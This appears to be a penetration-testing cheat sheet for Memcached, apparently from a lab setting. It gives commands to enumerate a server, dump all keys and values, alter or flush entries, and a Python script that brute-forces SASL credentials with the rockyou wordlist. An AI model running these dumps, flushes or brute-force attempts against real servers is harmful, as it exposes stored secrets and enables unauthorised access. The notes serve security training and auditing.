# Connecting
```
telnet localhost 11211
```

# Information gathering
```
nmap -p 11211 --script memcached-info
```
```
memcstat --servers=127.0.0.1
```

# Read value
```
memccat --servers=192.64.38.3 --username=user --password=pass flag
```
```
$ nc localhost 112111

get password
VALUE password 0 6
3dw4rd
END
```

# Key information and dump values
```
> version

> stats items
STAT items:3:number 1
STAT items:3:age 498
STAT items:22:number 1
STAT items:22:age 498
END

> stats cachedump <stab-id> <limit>
> stats cachedump 3 100
ITEM views.decorators.cache.cache_header..cc7d9 [6 b; 1256056128 s]
END
```
# Increment decrement
```
> incr <id> 1
> decr <id> 1
```

# Set new entry
```
> set phone 0 60 9
> 123456789
```

# Modify value
```
> replace <key> 0 0 2
> <new-value>
```
```
> prepend address 0 0 6
> house
```
```
append address 0 0 6
,73301
```

# Delete
```
> delete old_address
```
```
> flush_all 30
```
invalidate all keys after 30 s

# Dump all keys
```
memcdump --verbose --debug --servers=127.0.0.1 | tee keys.lst
```

# Dump all key-values
```
memcached-tool localhost:11211 dump | less
```
```
while read -r key; do
    [ -f "$key" ] || echo "get $key" | nc localhost 11211 > "$key.dump";
done < <(memcdump --server localhost)
```

```
memcdump --servers=localhost | xargs -L1 -I% sh -c 'echo "get %" | nc localhost 11211'
```

```
function memcmd() {
  exec {memcache}<>/dev/tcp/localhost/11211
  printf "%s\n%s\n" "$*" quit >&${memcache}
  cat <&${memcache}
}
```

## 1.4.31 and above
```
memcmd lru_crawler metadump all
```

## 1.4.30 and below
```
memcmd stats items
memcmd stats cachedump 1 0
```

```
for id in $(memcmd stats items | grep -o ":[0-9]\+:" | tr -d : | sort -nu); do
    memcmd stats cachedump $id 0
done
```

# Libraries

- Python: https://github.com/abstatic/python-memcached-stats

# Bruteforce

```python
#!/usr/bin/python3
import subprocess

dictionary=open("/usr/share/wordlists/rockyou.txt")
for pwd in dictionary:
    out=subprocess.getoutput('memcstat --servers=192.64.38.3 --username=student --password='+pwd)
    if len(out)>0:
        print(out)
        print("PASSWORD: "+pwd)
        break
```
